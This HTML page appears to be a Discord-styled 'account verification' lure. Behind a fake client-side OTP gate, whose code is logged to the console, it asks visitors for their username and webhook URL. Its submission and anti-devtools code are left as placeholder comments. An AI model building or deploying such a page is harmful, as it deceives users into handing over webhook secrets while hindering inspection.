<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #5865F2;
            --primary-hover: #4752C4;
            --secondary: #2F3136;
            --secondary-hover: #36393F;
            --background: #121212;
            --surface: rgba(30, 30, 30, 0.85);
            --text: #F3F4F6;
            --text-secondary: #D1D5DB;
            --border: #3A3A3A;
            --success: #10B981;
            --error: #EF4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--background);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .particle {
            position: absolute;
            background: rgba(88, 101, 242, 0.15);
            border-radius: 50%;
            pointer-events: none;
            transition: transform 0.3s ease-out;
        }

        .verification-card {
            background-color: var(--surface);
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 420px;
            padding: 32px;
            border: 1px solid var(--border);
            transform: translateY(0);
            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.1), 
                        box-shadow 0.3s ease;
            backdrop-filter: blur(10px);
            z-index: 10;
            animation: float 6s ease-in-out infinite;
        }

        .verification-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }

        .card-header {
            text-align: center;
            margin-bottom: 28px;
        }

        .card-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            background: linear-gradient(90deg, #5865F2, #EB459E);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .card-header p {
            color: var(--text-secondary);
            font-size: 14px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
            color: var(--text-secondary);
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            background-color: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 14px;
            transition: all 0.25s ease;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.15);
        }

        .action-button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            border: none;
            position: relative;
            overflow: hidden;
        }

        .action-button::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
            opacity: 0;
            transition: opacity 0.25s ease;
        }

        .action-button:hover::after {
            opacity: 1;
        }

        .primary-button {
            background-color: var(--primary);
            color: white;
            margin-bottom: 12px;
        }

        .primary-button:hover {
            background-color: var(--primary-hover);
            transform: translateY(-2px);
        }

        .secondary-button {
            background-color: var(--secondary);
            color: var(--text);
        }

        .secondary-button:hover {
            background-color: var(--secondary-hover);
        }

        .action-button:active {
            transform: translateY(0) scale(0.98);
        }

        .status-indicator {
            margin-top: 16px;
            text-align: center;
            font-size: 13px;
            font-weight: 500;
            min-height: 20px;
            opacity: 0;
            transform: translateY(5px);
            transition: all 0.3s ease;
        }

        .status-indicator.visible {
            opacity: 1;
            transform: translateY(0);
        }

        .status-success {
            color: var(--success);
        }

        .status-error {
            color: var(--error);
        }

        .loading .button-text {
            visibility: hidden;
            opacity: 0;
        }

        .loading::before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        @keyframes float-particle {
            0%, 100% { transform: translateY(0) translateX(0); }
            50% { transform: translateY(-20px) translateX(10px); }
        }

        /* OTP Overlay - Matches original design perfectly */
        #otpOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(18, 18, 18, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <!-- OTP Verification (Same design as original form) -->
    <div id="otpOverlay">
        <div class="verification-card">
            <div class="card-header">
                <h1>Secure Access</h1>
                <p>Your OTP expires in <span id="otpTimer">01:00</span></p>
            </div>
            <form id="otpForm">
                <div class="input-group">
                    <label for="otpInput">Verification Code</label>
                    <input type="password" id="otpInput" class="form-input" placeholder="Enter 6-digit code" required>
                </div>
                <button type="submit" class="action-button primary-button">
                    <span class="button-text">Verify</span>
                </button>
                <div class="status-indicator" id="otpStatus"></div>
            </form>
        </div>
    </div>
    
    <!-- Original Content (Hidden Initially) -->
    <div id="mainContent" style="display: none;">
        <div class="verification-card">
            <div class="card-header">
                <h1>Account Verification</h1>
                <p>Complete verification to access premium features</p>
            </div>
            <form id="verificationForm">
                <div class="input-group">
                    <label for="userIdentifier">Discord Username</label>
                    <input type="text" id="userIdentifier" class="form-input" placeholder="username#0000" required>
                </div>
                <div class="input-group">
                    <label for="webhookEndpoint">Webhook URL</label>
                    <input type="url" id="webhookEndpoint" class="form-input" placeholder="https://discord.com/api/webhooks/..." required>
                </div>
                <button type="submit" class="action-button primary-button" id="verifyButton">
                    <span class="button-text">Verify Account</span>
                </button>
                <a href="https://discord.gg/tQrz6hFh4W" class="action-button secondary-button" id="communityButton">
                    <span class="button-text">Join Our Community</span>
                </a>
                <div class="status-indicator" id="statusDisplay"></div>
            </form>
        </div>
    </div>

    <script>
        // ===== 1-MINUTE OTP SYSTEM =====
        const OTP_DURATION = 60 * 1000; // 1 minute in milliseconds
        let currentOTP = generateOTP();
        let otpExpiryTime = Date.now() + OTP_DURATION;
        let otpAttempts = 0;
        const MAX_ATTEMPTS = 3;

        function generateOTP() {
            return Math.floor(100000 + Math.random() * 900000).toString();
        }

        function refreshOTP() {
            currentOTP = generateOTP();
            otpExpiryTime = Date.now() + OTP_DURATION;
            console.log(`Current OTP: ${currentOTP} (Valid for 1 minute)`);
            updateOTPTimer();
        }

        function updateOTPTimer() {
            const timeLeft = Math.max(0, otpExpiryTime - Date.now());
            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
            document.getElementById('otpTimer').textContent = 
                `00:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft <= 0) {
                refreshOTP();
            } else {
                setTimeout(updateOTPTimer, 1000);
            }
        }

        // Initialize
        refreshOTP();
        updateOTPTimer();

        // ===== ANTI-DEVTOOLS PROTECTION =====
        (function() {
            // [Your existing anti-devtools code remains exactly the same]
        })();

        document.addEventListener('DOMContentLoaded', () => {
            // ===== PARTICLES =====
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 30; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.cssText = `
                    width: ${Math.random() * 15 + 5}px;
                    height: ${Math.random() * 15 + 5}px;
                    left: ${Math.random() * 100}vw;
                    top: ${Math.random() * 100}vh;
                    opacity: ${Math.random() * 0.2 + 0.1};
                    animation: float-particle ${Math.random() * 20 + 10}s ease-in-out ${Math.random() * 5}s infinite;
                `;
                particlesContainer.appendChild(particle);
            }

            // ===== OTP FORM =====
            document.getElementById('otpForm').addEventListener('submit', (e) => {
                e.preventDefault();
                const otpInput = document.getElementById('otpInput').value;
                const otpStatus = document.getElementById('otpStatus');
                
                otpAttempts++;
                
                if (Date.now() > otpExpiryTime) {
                    otpStatus.textContent = "OTP expired - please refresh";
                    otpStatus.className = "status-indicator visible status-error";
                    return;
                }
                
                if (otpInput === currentOTP) {
                    otpStatus.textContent = "Access granted!";
                    otpStatus.className = "status-indicator visible status-success";
                    setTimeout(() => {
                        document.getElementById('otpOverlay').style.display = 'none';
                        document.getElementById('mainContent').style.display = 'block';
                    }, 1000);
                } else if (otpAttempts >= MAX_ATTEMPTS) {
                    otpStatus.textContent = "Maximum attempts reached!";
                    otpStatus.className = "status-indicator visible status-error";
                    e.target.querySelector('button').disabled = true;
                } else {
                    otpStatus.textContent = `Invalid code (${MAX_ATTEMPTS - otpAttempts} tries left)`;
                    otpStatus.className = "status-indicator visible status-error";
                }
            });

            // [Rest of your original code remains exactly the same]
        });
    </script>
</body>
</html>
